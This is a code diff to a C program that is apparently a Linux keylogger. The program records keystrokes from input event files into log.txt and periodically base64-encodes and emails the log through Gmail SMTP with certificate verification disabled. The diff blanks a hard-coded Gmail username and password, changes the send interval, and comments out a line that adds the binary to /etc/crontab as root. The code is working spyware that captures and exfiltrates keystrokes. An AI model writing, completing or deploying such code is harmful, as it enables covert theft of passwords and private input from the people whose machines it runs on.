@@ -306,7 +306,7 @@ int send_email(){
     struct upload_status upload_ctx = { 0 };
 
     FILE *fp_text;
-    char *buff = malloc(sizeof(char) *1024*1024);
+    char *buff = malloc(sizeof(char) *1024*1024*100);
     fp_text = fopen("log.txt", "r");
     fscanf(fp_text, "%s", buff);
     char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
@@ -324,8 +324,8 @@ int send_email(){
 
     curl = curl_easy_init();
     if(curl) {
-        curl_easy_setopt(curl, CURLOPT_USERNAME, "doi2xuyenviet7@gmail.com"); ///////////////// Edit here
-        curl_easy_setopt(curl, CURLOPT_PASSWORD, "@123456789@"); ///////////////// Edit here
+        curl_easy_setopt(curl, CURLOPT_USERNAME, ""); ///////////////// Edit here
+        curl_easy_setopt(curl, CURLOPT_PASSWORD, ""); ///////////////// Edit here
         curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
         curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -360,13 +360,12 @@ int send_email(){
     free(enc);
     fclose(fp_text);
     fclose(fp_image);
-    system("rm log.txt");
     return (int)res;
 }
 
 void *trigger_send_email(){
     while(1){
-        sleep(5*60);
+        sleep(15*60);
         send_email();
     }
 }
@@ -374,7 +373,7 @@ void *trigger_send_email(){
 void *keylogger(){
     find_event_file_path();
 
-    FILE * fp_out = fopen("log.txt", "w");
+    FILE * fp_out = fopen("log.txt", "w+");
     struct input_event event;
     int shift_flag = 0;
 
@@ -406,7 +405,7 @@ void *keylogger(){
 }
 
 int main() {
-    system("echo \"00 09 * * * root $(pwd)/keylogger\" >> /etc/crontab");
+    //system("echo \"00 09 * * * root $(pwd)/keylogger\" >> /etc/crontab");
 
     pthread_t tid_keylogger;
     pthread_create(&tid_keylogger, NULL, keylogger, (void *)&keylogger);
